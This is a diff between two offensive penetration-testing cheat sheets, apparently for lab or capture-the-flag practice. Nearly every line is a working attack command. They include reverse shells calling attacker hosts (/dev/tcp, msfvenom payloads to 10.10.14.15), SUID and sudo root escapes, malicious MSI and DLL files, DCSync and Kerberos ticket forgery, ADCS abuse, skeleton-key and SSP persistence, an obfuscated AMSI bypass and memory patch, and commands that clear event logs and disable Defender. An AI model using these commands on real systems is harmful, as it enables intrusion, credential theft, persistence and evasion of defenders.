@@ -1,630 +1,583 @@
-######################################################################
-# CHEATSHEET - NETWORK & ENUMERATION
-######################################################################
+# LinPEAS shows: /usr/bin/find (SUID)
+find / -exec /bin/bash -p \; -quit
 
-# Quick top 1000 TCP scan - basic enumeration
-nmap -sC -sV -oN nmap_quick_$targetip.txt $targetip
+# LinPEAS shows: /usr/bin/vim (SUID)
+vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 
-# Full TCP port scan - find all open TCP ports
-nmap -p- --min-rate 1500 -oN nmap_allports_$targetip.txt $targetip
+# LinPEAS shows: /usr/bin/bash (SUID)
+bash -p
 
-# Aggressive full TCP scan with tuning - deeper enumeration
-nmap -p- -Pn $targetip -v -T4 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmap_aggr_$targetip.txt
+# LinPEAS shows: /usr/bin/nmap (SUID)
+nmap --interactive
+!sh
 
-# Service/version & default scripts on specific ports
-# Example: -p 80,135,139,445,3389
-nmap -sC -sV -p <ports> -oN nmap_detail_$targetip.txt $targetip
+# LinPEAS shows: /usr/bin/awk (SUID)
+awk 'BEGIN {system("/bin/bash -p")}'
 
-# UDP top ports scan - find important UDP services
-nmap -sU --top-ports 100 -oN nmap_udp_top100_$targetip.txt $targetip
+# LinPEAS shows: /usr/bin/less (SUID)
+less /etc/passwd
+!bash
 
-# Nmap script scan against HTTP services - web vuln checks
-nmap -sV --script=http-enum,http-title -p80,443,8080 -oN nmap_http_scripts_$targetip.txt $targetip
+# Custom SUID exploit
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/exploit.c
+gcc /tmp/exploit.c -o /tmp/exploit
+chmod +s /tmp/exploit
 
-# Nmap script scan against SMB services - smb enumeration
-nmap -sV --script=smb-enum-shares,smb-enum-users -p445 -oN nmap_smb_scripts_$targetip.txt $targetip
 
+# LinPEAS shows: /usr/bin/python3.8 = cap_setuid+ep
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-######################################################################
-# WEB ENUMERATION
-######################################################################
+# LinPEAS shows: /usr/bin/perl = cap_setuid+ep
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 
-# Directory brute force - HTTP directory fuzzing (Gobuster)
-gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/common.txt -o gobuster_common_$targetip.txt
+# LinPEAS shows: /usr/bin/php = cap_setuid+ep
+php -r "posix_setuid(0); system('/bin/bash');"
 
-# Directory brute force (big wordlist) - deeper discovery
-gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/big.txt -o gobuster_big_$targetip.txt
 
-# Recursive content discovery - Feroxbuster
-feroxbuster -u http://$targetip -w /usr/share/wordlists/dirb/common.txt -o ferox_$targetip.txt
+# Check: sudo -l
+# If shows: (ALL) NOPASSWD: ALL
+sudo bash
 
-# Web fingerprinting - detect technologies
-whatweb $targetip
+# If shows: (root) NOPASSWD: /usr/bin/find
+sudo find /etc/passwd -exec bash \;
 
-# Basic web vuln scanning - Nikto
-nikto -h $targetip -output nikto_$targetip.txt
+# If shows: (root) NOPASSWD: /usr/bin/vi
+sudo vi -c ':!bash'
 
-######################################################################
-# SMB ENUMERATION
-######################################################################
+# If shows: (root) NOPASSWD: /usr/bin/awk
+sudo awk 'BEGIN {system("/bin/bash")}'
 
-# List SMB shares with anonymous access - smbclient
-smbclient -L //$targetip/ -N
+# If shows: (root) NOPASSWD: /usr/bin/nmap
+echo 'os.execute("/bin/bash")' > /tmp/shell.nse
+sudo nmap --script=/tmp/shell.nse
 
-# Connect to specific SMB share with anonymous auth
-smbclient //$targetip/$target -U ""
+# If shows: (root) NOPASSWD: /usr/bin/git
+sudo git -p help
+!/bin/bash
 
-# Connect to specific SMB share with empty password
-smbclient //$targetip/$target -N
+# If shows: (root) NOPASSWD: /usr/bin/less
+sudo less /etc/passwd
+!/bin/bash
 
-# SMB enumeration via enum4linux-ng
-enum4linux-ng -A $targetip | tee enum4linux_$targetip.txt
+# LinPEAS shows writable cron script
+echo '#!/bin/bash' > /path/to/cron/script.sh
+echo 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1' >> /path/to/cron/script.sh
+chmod +x /path/to/cron/script.sh
 
-# smbmap - anonymous
-smbmap -H $targetip
+# Or if script runs as root and includes wildcard
+# Create file: echo 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1' > /tmp/shell.sh
+# Make executable: chmod +x /tmp/shell.sh
+# Create symlink: ln -s /tmp/shell.sh /path/to/wildcard*
 
-# smbmap - with credentials
-smbmap -H $targetip -u $user -p "$password"
+# WinPEAS shows: SERVICE - Weak Permissions (Users can modify)
+# 1. Check service permissions:
+sc.exe qc SERVICE_NAME
+accesschk.exe -ucqv SERVICE_NAME
 
-# CrackMapExec SMB basic enumeration - check SMB info
-crackmapexec smb $targetip
+# 2. If Users can modify:
+sc.exe config SERVICE_NAME binPath= "C:\Windows\System32\cmd.exe /c net user hacker Password123! /add"
+sc.exe stop SERVICE_NAME
+sc.exe start SERVICE_NAME
 
-# CrackMapExec SMB auth check - username/password
-crackmapexec smb $targetip -u $user -p "$password"
+# 3. Alternative with PowerShell:
+Set-Service -Name SERVICE_NAME -BinaryPathName "cmd.exe /c net localgroup administrators hacker /add"
+Restart-Service -Name SERVICE_NAME -Force
 
-# CrackMapExec SMB share listing - list accessible shares
-crackmapexec smb $targetip -u $user -p "$password" --shares
+# WinPEAS shows: Unquoted Service Path - "C:\Program Files\Some Folder\service.exe"
+# 1. Check writable directories:
+icacls "C:\"
+icacls "C:\Program Files"
 
-# NetExec SMB basic enumeration - SMB scan
-netexec smb $targetip
+# 2. If "C:\Program" is writable:
+copy C:\Windows\System32\cmd.exe "C:\Program.exe"
+sc stop SERVICE_NAME
+sc start SERVICE_NAME
 
-# NetExec SMB users enumeration with creds
-netexec smb $targetip -u $user -p "$password" --users
+# 3. Or create payload:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -o Program.exe
 
-# NetExec SMB shares enumeration with creds
-netexec smb $targetip -u $user -p "$password" --shares
+# WinPEAS shows: AlwaysInstallElevated - 1
+# 1. Create malicious MSI:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f msi -o setup.msi
 
-# NetExec SMB RID brute forcing - enumerating users via RID
-netexec smb $targetip -u $user -p "$password" --rid-brute
+# 2. Transfer and install:
+msiexec /quiet /qn /i C:\temp\setup.msi
 
-# NetExec SMB user enumeration with guest / anonymous
-netexec smb $targetip -u guest -p '' --users
+# 3. Alternative with PowerShell:
+$Command = "net user hacker Password123! /add && net localgroup administrators hacker /add"
+$WScript = New-Object -ComObject WScript.Shell
+$WScript.Run("cmd /c $Command", 0, $true)
 
-# NetExec SMB spider_plus module - crawl & download interesting files
-netexec smb $targetip -u $user -p "$password" -M spider_plus -o DOWNLOAD_FLAG=True
+# WinPEAS shows: DLL Hijacking possible
+# 1. Find missing DLL:
+procmon.exe (Filter for "NAME NOT FOUND")
 
-# Validate credentials on DC (fastest check)
-crackmapexec smb $targetip -u $user -p "$password" --local-auth
+# 2. Create malicious DLL:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f dll -o hijack.dll
 
-# Sometimes SMB requires explicit domain (. or WORKGROUP)
-crackmapexec smb $targetip -u $user -p "$password" -d $domain
-crackmapexec smb $targetip -u $user -p "$password" -d WORKGROUP
-crackmapexec smb $targetip -u $user -p "$password" -d .
+# 3. Place in writable directory
+copy hijack.dll "C:\ProgramData\Missing.dll"
 
-######################################################################
-# RPC / SAMR ENUMERATION
-######################################################################
+# BloodHound shows: User has DCSync rights
+# 1. Verify with PowerView:
+Get-ObjectAcl -Identity "DC=domain,DC=com" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $USER_SID}
 
-# RPCClient anonymous login
-rpcclient -N $targetip
+# 2. Perform DCSync attack:
+# Using Mimikatz:
+mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
 
-# RPCClient null session with explicit syntax
-rpcclient -U "" -N $targetip
+# Using Impacket from Kali:
+impacket-secretsdump domain.com/user:'password'@DC_IP
 
-# After login inside rpcclient:
-# enumdomusers
-# enumdomgroups
-# querydominfo
+# 3. Dump specific user:
+impacket-secretsdump -just-dc-user Administrator domain.com/user:'password'@DC_IP
 
+# BloodHound shows: GenericAll on User/Computer
+# 1. Reset password (if GenericAll on user):
+Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
 
-######################################################################
-# LDAP ENUMERATION
-######################################################################
+# 2. Add to privileged group (if GenericAll on group):
+Add-DomainGroupMember -Identity 'Domain Admins' -Members TargetUser
 
-# Anonymous LDAP search - base DSE this will return basedn.
-ldapsearch -x -H ldap://$targetip -s base
+# 3. WriteDACL - Give yourself DCSync rights:
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity AttackerUser -Rights DCSync
 
-# LDAP domain enumeration with base DN - set $basedn manually
-# Example: basedn='dc=hq,dc=vanguard,dc=bank'
-# How to automatically generate the baseDN from the domain
-ldapsearch -x -H ldap://$targetip -b "$basedn"
+# 4. WriteOwner - Take ownership then modify:
+Set-DomainObjectOwner -Identity TargetObject -OwnerIdentity AttackerUser
+Add-DomainObjectAcl -TargetIdentity TargetObject -PrincipalIdentity AttackerUser -Rights ResetPassword
 
-# NetExec LDAP users enumeration with anonymous or known creds
-netexec ldap $targetip -u "" -p "" --users
-netexec ldap $targetip -u $user -p "$password" --users
+# BloodHound shows: Can create computer objects (ms-DS-MachineAccountQuota > 0)
+# 1. Create computer account:
+New-MachineAccount -MachineAccount FAKECOMPUTER -Domain domain.com
 
-# Enumerate AD user descriptions (often contain passwords)
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=user)" sAMAccountName description
+# 2. Set RBCD on target:
+Set-DomainObject -Identity TARGETCOMPUTER$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=@('FAKECOMPUTER$')}
 
-# Enumerate groups with description
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=group)" cn description
+# 3. Get hash of FAKECOMPUTER:
+Rubeus.exe hash /password:Password123! /user:FAKECOMPUTER$ /domain:domain.com
 
-# Enumerate AD organizational units
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=organizationalUnit)" ou
+# 4. Get service ticket:
+Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGETCOMPUTER.domain.com /ptt
 
-# Enumerate domain policies
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=groupPolicyContainer)" gPCFileSysPath
+# 5. Access target:
+dir \\TARGETCOMPUTER.domain.com\C$
 
+# BloodHound shows: Computer with Unconstrained Delegation
+# 1. Find computers with unconstrained delegation:
+Get-DomainComputer -Unconstrained | Select-Object Name
 
-######################################################################
-# WINRM & RDP ACCESS
-######################################################################
-# Check if WinRM port is reachable before attempting login
-curl -I http://$targetip:5985
-curl -I http://$targetip:5986
+# 2. Monitor for DA tokens (on compromised machine):
+Rubeus.exe monitor /interval:5 /filteruser:DC01$
 
-# NetExec WINRM auth check - verify WinRM access
-netexec winrm $targetip -u $user -p "$password"
+# 3. When DA connects, dump tickets:
+Rubeus.exe triage
+Rubeus.exe dump /service:krbtgt /nowrap
 
-# CrackMapExec WINRM check
-crackmapexec winrm $targetip -u $user -p "$password"
+# 4. Import ticket on attacker machine:
+Rubeus.exe ptt /ticket:BASE64_TICKET
 
-# Evil-WinRM interactive PowerShell session
-evil-winrm -i $targetip -u $user -p "$password"
+# 5. DCSync with stolen ticket:
+impacket-secretsdump -k -no-pass domain.com/
 
-# Evil-WinRM with hash instead of password
-evil-winrm -i $targetip -u $user -H <NTLM_HASH>
+# BloodHound shows: Constrained Delegation with Protocol Transition
+# 1. Check for allowed delegation:
+Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
 
-# RDP connection using xfreerdp (Linux client)
-xfreerdp /v:$targetip /u:$user /p:"$password" /dynamic-resolution +clipboard
+# 2. Request TGT with Rubeus:
+Rubeus.exe asktgt /user:ServiceAccount /domain:domain.com /rc4:SERVICE_NTLM_HASH
 
-# RDP connection with specific domain
-xfreerdp /v:$targetip /u:$domain\\$user /p:"$password" /dynamic-resolution +clipboard
+# 3. Request service ticket for any service on target:
+Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.com /altservice:http,host,rpcss /ptt
 
-######################################################################
-# MSSQL ENUMERATION & EXPLOITATION
-######################################################################
+# 4. Access target service:
+dir \\TARGET.domain.com\C$
 
-# MSSQL client with SQL authentication - Impacket mssqlclient
-mssqlclient.py $user:"$password"@$targetip -port 1433
+# Certipy shows: ENROLLEE_SUPPLIES_SUBJECT enabled
+# 1. Request certificate:
+certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template VULNERABLE-TEMPLATE -upn Administrator@domain.com
 
-# MSSQL client with Windows authentication (AD)
-mssqlclient.py $domain/$user:"$password"@$targetip -windows-auth
+# 2. Get NT hash from certificate:
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
 
-# Enable xp_cmdshell in MSSQL (inside mssqlclient)
-# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# 3. Use hash for authentication:
+impacket-psexec -hashes :NTLM_HASH domain.com/Administrator@DC.domain.com
 
-# Execute OS commands via xp_cmdshell (inside mssqlclient)
-# EXEC xp_cmdshell 'whoami';
+# Same as ESC1 but template allows any purpose
+certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template ESC2-TEMPLATE -upn Administrator@domain.com -dns DC.domain.com
 
+# 1. Request enrollment agent certificate:
+certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template EnrollmentAgent -upn user@domain.com
 
-######################################################################
-# IMPACKET - AUTH, KERBEROASTING, DUMPS, SHELLS
-######################################################################
+# 2. Request certificate on behalf of Administrator:
+certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template User -on-behalf-of domain.com\\Administrator -pfx user.pfx
 
-# Request service tickets for all SPNs - Kerberoasting (screen only)
-impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip -request
+# 1. Modify template to be vulnerable:
+certipy template -u user@domain.com -p password -dc-ip DC_IP -template VULNERABLE-TEMPLATE -save-old -enrollee-supplies-subject
 
-# Kerberoasting with user list - output JtR-format hashes
-impacket-GetUserSPNs $domain/ -dc-ip $targetip -userfile users.txt -outputfile hashes_spn_john.txt -format john
+# 2. Now exploit as ESC1
 
-# AS-REP Roasting - find users without pre-auth (output for cracking)
-impacket-GetNPUsers $domain/ -dc-ip $targetip -usersfile users.txt -format john -outputfile asrep_hashes.txt
+# 1. Modify template to be vulnerable:
+certipy template -u user@domain.com -p password -dc-ip DC_IP -template VULNERABLE-TEMPLATE -save-old -enrollee-supplies-subject
 
-# Quick AS-REP roast (screen only, no file)
-impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass
+# 2. Now exploit as ESC1
 
-# Impacket WMIExec with cleartext password - remote semi-interactive shell
-impacket-wmiexec $domain/$user:"$password"@$targetip
+# 1. Check if vulnerable:
+certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable
 
-# Impacket WMIExec with NTLM hash - remote shell over RPC
-impacket-wmiexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+# 2. Exploit:
+certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template ANY-TEMPLATE -upn Administrator@domain.com
 
-# Impacket PSExec for interactive SYSTEM shell over SMB
-impacket-psexec $domain/$user:"$password"@$targetip
+# 1. Start relay:
+ntlmrelayx.py -t http://DC.domain.com/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 
-# Impacket PSExec with hash - pass-the-hash over SMB
-impacket-psexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+# 2. Force authentication (via PetitPotam, PrinterBug, etc.)
+python3 PetitPotam.py -d domain.com -u user -p password 10.10.14.15 DC.domain.com
 
-# Dump domain hashes from DC - NTDS.dit extraction (requires DA)
-impacket-secretsdump $domain/$user:"$password"@$targetip
+# 3. Get certificate, then get hash:
+certipy auth -pfx DC.pfx -dc-ip DC_IP
 
-# Dump only NTLM from DC - NTDS.dit quick dump
-impacket-secretsdump -just-dc-ntlm $domain/$user:"$password"@$targetip
 
-# DCSync attack - dump domain hashes via replication
-impacket-secretsdump -just-dc $domain/$user:"$password"@$targetip
+# BloodHound shows: User in DNSAdmins group
+# 1. Check membership:
+Get-ADGroupMember -Identity "DnsAdmins" | Select-Object Name
 
-# Dump local SAM hashes remotely from a host (local hive example)
-# (Use from mounted hives or live system with proper paths)
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+# 2. Create malicious DLL:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f dll -o malicious.dll
 
-# Test credentials using Kerberos TGT (very reliable)
-impacket-getTGT $domain/$user:$password
+# 3. Set DLL path:
+dnscmd.exe /config /serverlevelplugindll \\10.10.14.15\share\malicious.dll
 
-# Simple SMB authentication test
-impacket-smbclient $domain/$user:$password@$targetip
+# 4. Restart DNS service:
+sc.exe stop dns
+sc.exe start dns
 
-# Constrained Delegation - Obtain service ticket as another user
-impacket-getST -spn <service>/<hostname> -impersonate Administrator \
-$domain/$user:$password -dc-ip $targetip
+# Alternative with PowerShell:
+Set-DnsServerPlugin -Name "malicious" -DllPath "\\10.10.14.15\share\malicious.dll" -Load
+Restart-Service -Name DNS -Force
 
-######################################################################
-# NETEXEC / CRACKMAPEXEC - HASH DUMPING WORKFLOW
-######################################################################
 
-# NetExec SMB basic info
-netexec smb $targetip
+# BloodHound shows: Exchange Windows Permissions group
+# 1. Check if user has WriteDACL on Domain Object:
+Get-ObjectAcl -Identity "DC=domain,DC=com" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $USER_SID}
 
-# NetExec SMB auth with creds
-netexec smb $targetip -u $user -p "$password"
+# 2. Add DCSync rights to yourself:
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity AttackerUser -Rights DCSync
 
-# Dump SAM db remotely with NetExec - local admin required
-netexec smb $targetip -u $user -p "$password" --sam | grep -v '[*]' | awk -F: '{print $4}' | tee dumped_hashes.txt
+# 3. Perform DCSync:
+mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
 
-# Dump LSASS creds with lsassy module - local admin required
-netexec smb $targetip -u $user -p "$password" -M lsassy | grep -v '[*]' | awk -F: '{print $6}' >> dumped_hashes.txt
+# 4. Alternatively, if you have Exchange Server shell:
+# Check for SeAssignPrimaryToken/SeImpersonate privileges
+whoami /priv
+# Use JuicyPotato/RoguePotato if available
 
-# Dump NTDS.dit via ntdsutil module - DA/local admin on DC required
-netexec smb $targetip -u $user -p "$password" -M ntdsutil | grep -v '[*]' | awk -F: '{print $4}' >> dumped_hashes.txt
 
-# Clean up dumped hash list - unique hashes only
-awk 'NF {print $1}' dumped_hashes.txt | sort | uniq | tee unique_hashes.txt
 
-# RID brute forcing users - generate userlist
-netexec smb $targetip -u $user -p "$password" --rid-brute | grep -Ei 'sid|typeuser' | awk '{print $6}' | cut -d'\' -f2 | tee users.txt
+# Requirements: krbtgt hash
+# 1. Get krbtgt hash via DCSync:
+mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
 
-# Password spray / hash spray over SMB with NetExec
-netexec smb $targetip users.txt -H unique_hashes.txt --continue-on-success
+# 2. Create golden ticket:
+mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
 
-# Password/hash spray over WinRM
-netexec winrm $targetip users.txt -H unique_hashes.txt --continue-on-success
+# 3. Verify:
+klist
+dir \\DC.domain.com\C$
 
-# Password/hash spray over LDAP
-netexec ldap $targetip users.txt -H unique_hashes.txt --continue-on-success
+# 4. Create ticket file for later:
+mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:SID /krbtgt:HASH /ticket:golden.kirbi
 
-# Password/hash spray over WMI
-netexec wmi $targetip users.txt -H unique_hashes.txt --continue-on-success
+# 5. Use later:
+Rubeus.exe ptt /ticket:golden.kirbi
 
-# Simple password spray with CrackMapExec
-crackmapexec smb $targetip -u users.txt -p 'Password1!'
 
-# Safe password spray (avoids lockouts)
-crackmapexec smb $targetip -u users.txt -p passwords.txt --no-bruteforce
+# Requirements: Service account hash
+# 1. Get service account hash (e.g., CIFS, HOST, HTTP):
+mimikatz # sekurlsa::logonpasswords
 
-# Kerberos password spray (avoids SMB/WinRM detection)
-kerbrute passwordspray -d $domain --dc $targetip users.txt 'Password1!'
+# 2. Create silver ticket:
+mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:SID /target:DC.domain.com /service:cifs /rc4:SERVICE_HASH /ptt
 
-###############################
-# RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)
-###############################
+# 3. Access service:
+dir \\DC.domain.com\C$
 
-# Create a computer account (needed for RBCD attacks)
-addcomputer.py -dc-ip $targetip $domain/$user:$password \
--computer-name 'WINDEV01$' -computer-pass 'Pass123!'
+# 1. Inject skeleton key (requires DA on DC):
+mimikatz # misc::skeleton
 
-# Assign RBCD rights from attacker computer → target host
-impacket-rbcd -delegate-from 'WINDEV01$' \
--delegate-to 'TARGETSERVER$' -dc-ip $targetip \
--action write -user $user -password $password
+# 2. Now any user can use password "mimikatz" to authenticate
 
-# After RBCD is assigned, impersonate Administrator
-getST.py -spn cifs/TARGETSERVER.$domain \
--impersonate Administrator \
-"$domain/WINDEV01$":"Pass123!"
+# 3. Access with skeleton key:
+net use \\DC.domain.com\IPC$ /user:Administrator mimikatz
 
-###############################
-# UNCONSTRAINED DELEGATION (TGT Harvesting)
-###############################
 
-# Dump Kerberos tickets on compromised Windows machine
-Rubeus dump /nowrap
+# 1. Check if DSRM password is set:
+ntdsutil "set dsrm password" "reset password on server null" q q
 
-###############################
-# PRINTERBUG (Trigger authentication from the DC)
-###############################
+# 2. Change DSRM password (requires DA):
+ntdsutil
+set dsrm password
+reset password on server DC01
+<new_password>
+<new_password>
+q
+q
 
-# Coerce the DC to authenticate to your controlled machine
-printerbug.py $domain/$user:$password@$targetip $localip
+# 3. Enable DSRM logon:
+reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
 
-######################################################################
-# GETTING SHELLS USING HASHES
-######################################################################
+# 4. Logon with DSRM credentials:
+psexec.exe -s \\DC01 cmd.exe
 
-# SMB shell with hash - PSExec pass-the-hash
-impacket-psexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
 
-# RPC/WMI shell with hash - WMExec pass-the-hash
-impacket-wmiexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+# 1. Install malicious SSP (Mimikatz):
+mimikatz # misc::memssp
 
-# WinRM shell with hash - Evil-WinRM pass-the-hash
-evil-winrm -i $targetip -u $user -H <NTLMHASH>
+# 2. All logons will be logged to C:\Windows\System32\mimilsa.log
 
+# Alternative with custom SSP:
+copy mimilib.dll C:\Windows\System32\
+reg add "HKLM\System\CurrentControlSet\Control\Lsa\" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
 
-######################################################################
-# KERBEROS / USER ENUMERATION / GPP
-######################################################################
 
-# User enumeration against DC - Kerbrute userenum
-kerbrute userenum users.txt --dc $targetip -d $domain
+# 1. Get TGT with NTLM hash:
+Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:NTLM_HASH /ptt
 
-# Search Group Policy Preferences XML files in SMB/FS - gpp cpassword hunting (Windows)
-# findstr /S /I cpassword *.xml
+# 2. Use Kerberos authentication:
+dir \\DC.domain.com\C$
 
-# Decrypt GPP cpassword value - gpp-decrypt
-gpp-decrypt <cpassword_value>
+# 3. Alternative with AES key (more stealthy):
+Rubeus.exe asktgt /user:Administrator /domain:domain.com /aes256:AES_KEY /ptt
 
-# Enumerate only SPN users without requesting tickets (safe)
-impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip
+# 1. Export tickets from memory:
+Rubeus.exe dump /nowrap
 
+# 2. Pass ticket to another machine:
+Rubeus.exe ptt /ticket:BASE64_TICKET
 
-######################################################################
-# PASSWORD / HASH CRACKING
-######################################################################
+# 3. Use imported ticket:
+klist
+impacket-psexec -k -no-pass domain.com/Administrator@DC.domain.com
 
-# Identify hash type - haiti
-haiti hashes.txt
+# 1. Kerberoast all users with SPNs:
+Rubeus.exe kerberoast /outfile:hashes.txt
 
-# John the Ripper against hash file with rockyou.txt
-john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+# 2. Kerberoast specific user:
+Rubeus.exe kerberoast /user:sqlservice /outfile:sql.hash
 
-# John: show cracked passwords
-john hashes.txt --show
+# 3. Crack with hashcat:
+hashcat -m 13100 hashes.txt rockyou.txt --force
 
+# 1. Find AS-REP roastable users:
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
 
-######################################################################
-# REVERSE SHELLS & STABILIZATION
-######################################################################
+# 2. Crack:
+hashcat -m 18200 asrep.txt rockyou.txt --force
 
-# Netcat listener on attacker machine (Kali)
-nc -lvnp 4444
 
-# Bash reverse shell to $localip from target
-bash -i >& /dev/tcp/$localip/4444 0>&1
+# 1. Simple bypass:
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) ) ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 
-# Python reverse shell to $localip from target
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$localip",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
+# 2. Alternative:
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# Socat listener for fully interactive TTY on Kali
-socat file:`tty`,raw,echo=0 tcp-listen:4444
+# 3. Memory patch:
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
 
-# Socat reverse shell from target back to Kali
-socat tcp:$localip:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
+Add-Type $Win32
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Am" + "si" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 
-# Upgrade simple shell to TTY (Linux) - Python pty
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Then on Kali: Ctrl+Z, then:
-# stty raw -echo; fg; reset
+# 1. Clear event logs:
+wevtutil el | ForEach-Object {wevtutil cl "$_"}
 
+# 2. Clear specific logs:
+Clear-EventLog -LogName Security, Application, System
 
-######################################################################
-# LINUX PRIVILEGE ESCALATION - QUICK ENUM
-######################################################################
-# Check for PATH vulnerabilities
-echo $PATH
-ls -ld $(echo $PATH | tr ':' ' ')
+# 3. Disable logging:
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
+Set-MpPreference -DisableRealtimeMonitoring $true
 
-# GTFOBins-style SUID scan (extended)
-for bin in $(find / -perm -4000 -type f 2>/dev/null); do
-    echo "[SUID] $bin"
-done
+# 1. Patch ETW to avoid detection:
+[Reflection.Assembly]::LoadWithPartialName('System.Core')
+$etwProvider = [System.Diagnostics.Eventing.EventProvider]::new('Microsoft-Windows-Kernel-Processor-Power')
+$etwProvider.SetInformation(18, [byte[]]@(0x00, 0x00))
 
-# Check current user and groups
-id
-whoami
 
-# Kernel, OS, architecture info
-uname -a
-cat /etc/os-release
 
-# Check sudo permissions - sudo privesc
-sudo -l
 
-# Find SUID binaries - SUID privesc
-find / -perm -4000 -type f 2>/dev/null
 
-# Find SGID binaries
-find / -perm -2000 -type f 2>/dev/null
 
-# Find writable directories - world-writable paths
-find / -writable -type d 2>/dev/null
 
-# List cron jobs - cron privesc
-cat /etc/crontab
-ls -la /etc/cron.*
 
-# List capabilities - Linux capabilities privesc
-getcap -r / 2>/dev/null
 
-# Running processes - find interesting services
-ps aux
 
-# Network connections - find listening services
-ss -tunlp
 
